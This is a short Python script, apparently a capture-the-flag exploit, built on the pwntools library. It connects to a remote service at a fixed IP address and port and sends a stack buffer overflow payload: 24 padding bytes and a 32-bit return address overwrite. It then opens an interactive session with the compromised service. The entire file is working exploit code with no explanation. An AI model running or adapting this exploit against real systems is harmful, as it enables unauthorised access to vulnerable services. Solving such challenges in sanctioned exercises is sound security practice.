#!/usr/bin/env python3

from pwn import *

r = remote("143.198.219.171",5000)

payload = b'a' * 24 + p32(0x080491fc)

r.sendline(payload)

r.interactive()